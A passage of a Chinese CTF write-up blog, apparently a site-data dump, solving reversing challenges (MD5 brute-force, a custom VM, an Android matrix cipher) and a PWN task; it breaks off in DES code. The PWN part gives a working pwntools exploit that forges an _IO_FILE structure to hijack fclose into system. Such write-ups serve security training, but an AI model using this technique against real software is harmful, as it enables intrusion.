'562fe3cc50014c260d9e8cf4ed38c77ac022ad0cc0075a9ab14b412a1082d5f364c286cfc623aa8d7df7c088ebf7d71883664bdee4b613b7e7a51b5213470a8db020bf598aaa2b3e03ed02c85436268a4fdac5ac807506938103e775c50099ed4fdac5ac807506938103e775c50099edc231d607b6823fd0a68e813760809754d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3baa0184f8240e2fe46861dc8d15a819cb09dbec414336e741e9c73422df59de2976fb5209d8fc8bb8507245bcfa24ae11f6fb5209d8fc8bb8507245bcfa24ae11f00c77fbc60a5bfc466d3d069876ec34800c77fbc60a5bfc466d3d069876ec348df33464fb471c46abaf691c000a0e30d4fdac5ac807506938103e775c50099edf60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf700c77fbc60a5bfc466d3d069876ec348d168c21d10371a5ab61bcfe6c759ef6e9dbec414336e741e9c73422df59de297fcc94a20596f2619868f3a4bf52eadf79b37db091979bedf00a7095851ba6f5900c77fbc60a5bfc466d3d069876ec348f60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf7d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3ba183342997ffed4b3189e977d077a60b4f404a3368d2d8f57464f739d4ed01c0e'e = []for i in range(len(enc) / 32): e.append(enc[32*i:32*i+32])print ekey = '23333333333333333333333333333333'[:-1]print keyflag = ''for i in range(32): for ch in range(256): x = hashlib.md5(key + chr(ch)).digest() x = x.encode('hex').lower() x = hashlib.md5(x).digest() x = x.encode('hex').lower() if x == e[i]: flag += chr(ch) breakprint flag EASYVM第一次做的时候手撸：x05, 0x01, 0x0B, // mov r1, rB0x13, 0x03, 0x03, // xor r3, r30x13, 0x00, 0x00, // xor r0, r00x13, 0x04, 0x04, // xor r4, r4r1 = rB;r3 = r0 = r4 = 0;0x28, // enter the looploop:0x0C, 0x00, 0x33, // add r0, 0x330x14, 0x00, 0x20, // mov r0, r0 mod 0x200x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x00, // add_pch r9, r00x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x04, 0x0A, // mov r4, rA0x1B, 0x05, 0x04, // push r5, r40x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r0 += 0x33; r0 = r0 % 0x20; r9 = r1; r9 += r0; rA = r9; r4 = rA; r5 = r4 + 1; r3 += 0x01; if(r3 &gt;= 0x20) break;&#125;0x13, 0x00, 0x00, // xor r0, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x01, 0x04, 0x00, // mov r4, r00x13, 0x03, 0x03, // xor r3, r3r0 = 0;r8 = r5;r8 += 0xE0;r2 = r8;rA = r2;r0 = rA;r0 &amp;= 0xE0;r0 &gt;&gt;= 0x05;r0 &amp;= 0xFF;r4 = r0;r3 = 0;0x28, // enter the looploop:0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x1D, 0x05, 0x0A, // pop r5, rA0x0D, 0x0A, 0x00, // add rA, r00x1B, 0x05, 0x0A, // push r5, rA0x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x1F, // cmpl r3, 0x1F0x28, // jl loopwhile(1) // loop 0x1F times&#123; rA = r2; r0 = rA; r0 &amp;= 0x1F; r0 &lt;&lt;= 0x03; r0 &amp;= 0xFF; r5 = r0 + 1; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r0 &amp;= 0xE0; r0 &gt;&gt;= 0x05; r0 &amp;= 0xFF; rA = r5 - 1; rA += r0; r5 = rA + 1; r3 += 1; if(r3 &gt;= 0x1F) break;&#125;0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x0D, 0x00, 0x04, // add r0, r40x1B, 0x05, 0x00, // push r5, r00x13, 0x03, 0x03, // xor r3, r30x03, 0x04, 0x0D, // mov, r4, rD // 0xEFBEADDE0x28, // enter the looprA = r2;r0 = rA;r0 &amp;= 0x1F;r0 &lt;&lt;= 0x03;r0 &amp;= 0xFF;r0 += r4;r5 = r0 + 1;r3 = 0;r4 = rD;loop:0x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x1B, 0x05, 0x00, // push r5, r00x01, 0x00, 0x04, // mov r0, r40x0D, 0x00, 0x03, // and r0, r30x1D, 0x05, 0x0A, // pop r5, rA0x13, 0x0A, 0x00, // xor rA, r00x1B, 0x05, 0x0A, // push r5, rA0x22, 0x04, 0x08, // ror r4, 0x080x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r5 = r0 + 1; r0 = r4; r0 += r3; rA = r5 - 1; rA ^= r0; r5 = rA + 1; r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8)); r3 += 1; if(r3 &gt;= 0x20) break;&#125;0x13, 0x03, 0x03, // xor r3, r30x13, 0x04, 0x04, // xor r4, r40x05, 0x01, 0x0C, // mov r1, rC // enc0x28, // enter the loopr3 = r4 = 0;r1 = rC;loop:0x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x03, // add_pch r9, r30x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x00, 0x0A, // mov r0, rA0x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xDF, // add r8, 0xDF0x09, 0x0A, 0x08, // ldr_int rA, r80x1D, 0x05, 0x00, // pop r5, r00x1B, 0x05, 0x00, // push r5, r00x27, 0x00, 0x0A, // cmpeq r0, rA0x17, 0x04, 0x07, // mov r4, r4 | r70x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28 // jl loopwhile(1) // loop 0x20 times&#123; r9 = r1; r9 += r3; rA = r9; r0 = rA; r5 = r0 + 1; r8 = r5; r8 += 0xDF; rA = r8; r0 = r5 - 1; r5 = r0 + 1; r0 != rA r4 |= r7; r3 += 1; if(r3 &gt;= 0x20) break;&#125; 其实还是挺清楚的，可以逆出来。脚本如下： 123456789101112131415161718192021# reverse step3enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]key = [0xDE, 0xAD, 0xBE, 0xEF]enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]# reverse step2enc3 = [0 for i in range(32)]def f(a, b): return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)for i in range(1, 32): enc3[i] = f(enc2[i - 1], enc2[i])enc3[0] = f(enc2[31], enc2[0])# reverse step1enc4 = [0 for i in range(32)]j = 0for i in range(32): j += 0x33 enc4[j % 0x20] = enc3[i]flag = ''for ch in enc4: flag += chr(ch)print flag PWNChallenge1利用了_IO_FILE的相关漏洞，和之前一道练习题很类似： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int c; // [rsp+Ch] [rbp-4h] stream = fopen(\"test.txt\", \"r\"); init_func(); while ( 1 ) &#123; while ( 1 ) &#123; putchar('&gt;'); c = readline(); if ( c != 1 ) break; get_s(); &#125; if ( c != 2 ) break; put_s(); &#125; if ( c == 3 ) close_stream(); return 0LL;&#125; 输入的 s 可以覆盖掉 stream 指针，偏移是 0x100。 1234.bss:00000000006010C0 s db 100h dup(?) ; DATA XREF: get_s+4↑o.bss:00000000006010C0 ; put_s+4↑o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream dq ? ; DATA XREF: close_stream+4↑r 关于_IO_FILE 一些 symbol 在 gdb 里可以看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263assassinq&gt;&gt; p sizeof(FILE)$1 = 0xd8assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)$2 = 0xe0assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin$3 = &#123; file = &#123; _flags = 0xfbad208b, _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;&#125;assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable$4 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;&#125; 想法是把 stream 覆盖成 bss 上构造的部分，fclose 就会触发 system，Exploit： 123456789101112131415161718192021222324#!/usr/bin/env pythonfrom pwn import *binary = './task_challenge1'elf = ELF(binary)context.log_level = 'debug'context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']local = 1if local: p = process(binary)else: p = remote('202.112.51.184', 30003)ub_offset = 0x3c4b30p.sendlineafter('&gt;', '1')gdb.attach(p)buf_addr = 0x6010C0system = 0x400897payload = ( ((('\\0' * 0x10 + p64(system) + '\\0' * 70).ljust(0x88,'\\0') + p64(buf_addr)).ljust(0xd8, '\\0') + p64(buf_addr)).ljust(0x100, '\\0') + p64(buf_addr))p.sendline(payload)p.sendlineafter('&gt;', '3')p.interactive() MOBILESWAG拖进 jadx，直接看 Mainactivity 中的函数，可以知道对输入数据进行了长度的判断和内容的正则判断。然后还存在 native 层，需要对 so 文件分析。 在 ida 里能看出经过两次加密过程，仔细发现其实是矩阵的一些操作，先对矩阵转置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101char **__fastcall matrix_transpos(char **matrix)&#123; char *v1; // x8 char *v2; // x11 char *v3; // x8 char *v4; // x8 char *v5; // x8 char *v6; // x8 char *v7; // x8 char *v8; // x9 char *v9; // x8 char *v10; // x9 char *v11; // x8 char *v12; // x9 char *v13; // x8 char *v14; // x9 char *v15; // x8 char *v16; // x9 char *v17; // x8 char *v18; // x9 char *v19; // x8 char *v20; // x9 char *v21; // x8 char *v22; // x9 char *v23; // x8 char *v24; // x9 char *v25; // x8 char *v26; // x9 v1 = matrix[1]; LODWORD(v2) = *((_DWORD *)*matrix + 1); *((_DWORD *)*matrix + 1) = *(_DWORD *)v1; *(_DWORD *)v1 = (_DWORD)v2; v3 = matrix[2]; LODWORD(v2) = *((_DWORD *)*matrix + 2); *((_DWORD *)*matrix + 2) = *(_DWORD *)v3; *(_DWORD *)v3 = (_DWORD)v2; v4 = matrix[3]; LODWORD(v2) = *((_DWORD *)*matrix + 3); *((_DWORD *)*matrix + 3) = *(_DWORD *)v4; *(_DWORD *)v4 = (_DWORD)v2; v5 = matrix[4]; LODWORD(v2) = *((_DWORD *)*matrix + 4); *((_DWORD *)*matrix + 4) = *(_DWORD *)v5; *(_DWORD *)v5 = (_DWORD)v2; v6 = matrix[5]; LODWORD(v2) = *((_DWORD *)*matrix + 5); *((_DWORD *)*matrix + 5) = *(_DWORD *)v6; *(_DWORD *)v6 = (_DWORD)v2; v8 = matrix[1]; v7 = matrix[2]; LODWORD(v2) = *((_DWORD *)v8 + 2); *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1); *((_DWORD *)v7 + 1) = (_DWORD)v2; v9 = matrix[3]; v10 = matrix[1]; LODWORD(v2) = *((_DWORD *)v10 + 3); *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1); *((_DWORD *)v9 + 1) = (_DWORD)v2; v11 = matrix[4]; v12 = matrix[1]; LODWORD(v2) = *((_DWORD *)v12 + 4); *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1); *((_DWORD *)v11 + 1) = (_DWORD)v2; v13 = matrix[5]; v14 = matrix[1]; LODWORD(v2) = *((_DWORD *)v14 + 5); *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1); *((_DWORD *)v13 + 1) = (_DWORD)v2; v16 = matrix[2]; v15 = matrix[3]; LODWORD(v2) = *((_DWORD *)v16 + 3); *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2); *((_DWORD *)v15 + 2) = (_DWORD)v2; v17 = matrix[4]; v18 = matrix[2]; LODWORD(v2) = *((_DWORD *)v18 + 4); *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2); *((_DWORD *)v17 + 2) = (_DWORD)v2; v19 = matrix[5]; v20 = matrix[2]; LODWORD(v2) = *((_DWORD *)v20 + 5); *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2); *((_DWORD *)v19 + 2) = (_DWORD)v2; v22 = matrix[3]; v21 = matrix[4]; LODWORD(v2) = *((_DWORD *)v22 + 4); *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3); *((_DWORD *)v21 + 3) = (_DWORD)v2; v23 = matrix[5]; v24 = matrix[3]; LODWORD(v2) = *((_DWORD *)v24 + 5); *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3); *((_DWORD *)v23 + 3) = (_DWORD)v2; v26 = matrix[4]; v25 = matrix[5]; LODWORD(v2) = *((_DWORD *)v26 + 5); *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4); *((_DWORD *)v25 + 4) = (_DWORD)v2; return matrix;&#125; 再将两个矩阵相乘： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546char *__fastcall matrix_inverse(char *matrix, char *data)&#123; char *v2; // x19 char *v3; // x22 char *v4; // x20 char *v5; // x21 char *v6; // x0 __int64 i; // x8 char *v8; // x9 char *v9; // x10 __int64 j; // x11 v2 = matrix; v3 = data; v4 = (char *)malloc(48LL); v5 = (char *)malloc(24LL); *(_QWORD *)v4 = v5; *((_QWORD *)v4 + 1) = malloc(24LL); *((_QWORD *)v4 + 2) = malloc(24LL); *((_QWORD *)v4 + 3) = malloc(24LL); *((_QWORD *)v4 + 4) = malloc(24LL); v6 = (char *)malloc(24LL); i = 0LL; *((_QWORD *)v4 + 5) = v6; while ( 1 ) &#123; v9 = *(char **)&amp;v2[8 * i]; j = 0LL; do &#123; v8 = v3 + 72; *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9 + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1) + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2) + *(_DWORD *)&amp;v8[j] * *((_DWORD *)v9 + 3) + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4) + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5); j += 4LL; &#125; while ( j != 24 ); if ( ++i == 6 ) break; v5 = *(char **)&amp;v4[8 * i]; &#125; return v4;&#125; 那么这个过程用 numpy 就能解出来，解题脚本： 12345678910111213141516171819202122232425from numpy import *enc = [ 0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [ 0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]trans_data = mat(data).reshape(6, 6)trans_enc = mat(enc).reshape(6, 6)trans = trans_enc * trans_data.Ires = trans.T.reshape(1, 36).tolist()[0]flag = ''for ch in res: flag += chr(int(round(ch)))print(flag) 因为还没学过线代，还没看懂的时候，硬生生现学现用 z3 把矩阵求逆的过程解出来了，所以顺便贴一波现学的 z3 脚本： 123456789101112131415161718192021222324from z3 import *enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]i = 0res = ''while(1): s = Solver() n0 = Int('n0') n1 = Int('n1') n2 = Int('n2') n3 = Int('n3') n4 = Int('n4') n5 = Int('n5') s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30]) s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31]) s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32]) s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33]) s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34]) s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35]) s.check() print s.model() if i == 5: break i += 1 参考网站http://yugod.xmutsec.com/index.php/2018/08/10/42.htmlhttps://www.jianshu.com/p/028c0c6270c3https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Deehttps://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0https://www.jianshu.com/p/110f715c210f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-QCTF","slug":"2018-QCTF","date":"2018-07-21T11:56:59.000Z","updated":"2019-08-29T00:58:28.550Z","comments":true,"path":"2018/07/21/2018-QCTF/","link":"","permalink":"qianfei11.coding.me/2018/07/21/2018-QCTF/","excerpt":"其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。","text":"其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。 MISCpicture通过 stegsolve 判断出存在最低位隐写。使用 lsb 工具解出密文，为一段加密函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290#_*_ coding:utf-8 _*_import reimport sysip= (58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9 , 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7)ip_1=(40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25)e =(32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12,13, 12, 13, 14, 15, 16, 17, 16,17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,24, 25, 26, 27, 28, 29,28, 29, 30, 31, 32, 1)p=(16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25)s=[ [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]pc1=(57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4);pc2= (14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32)d = ( 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1)__all__=['desencode']class DES(): def __init__(self): pass def code(self,from_code,key,code_len,key_len): output=\"\" trun_len=0 code_string=self._functionCharToA(from_code,code_len) code_key=self._functionCharToA(key,key_len) if code_len%16!=0: real_len=(code_len/16)*16+16 else: real_len=code_len if 